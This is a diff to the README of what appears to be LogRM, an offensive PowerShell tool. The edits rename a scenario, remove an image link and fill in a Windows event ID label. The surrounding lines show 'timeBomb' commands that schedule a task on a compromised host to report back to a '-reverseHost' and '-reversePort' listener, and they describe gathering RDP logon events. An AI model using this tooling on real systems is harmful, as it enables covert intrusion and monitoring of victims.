@@ -141,9 +141,9 @@ PS> timeBomb -task once -at 15:00 -newest <give a big number> -reverseHost <Pyth
 PS> timeBomb -task once -at 15:00 -ip 127.0.0.1 -newest <give a big number> -reverseHost <Python server ip> -reversePort <Python server port>
 ```
 
-#### Scenario 1 - User is logged of
+#### Scenario 3 - User is logged of and TimeBomb sent a notification to our remote server.
 
-![alt text](https://github.com/tasox/LogRM/blob/master/timBomb_task_once.png)
+![alt text]()
 
 
 The task is going to run and stop at specific time.
@@ -158,11 +158,10 @@ RDPConn function gets only valid incoming RDP connections into the compromised h
 
 RDPConn function uses the following events
 
-1)  - 21
+1) Session logon succeeded - 21
 2) Session has been disconneted - 24
 3) Session reconnection succeeded - 25
 
-Note: In the next update i will add event 21 for remote desktop services.
 
 ```
 PS> RDPConn
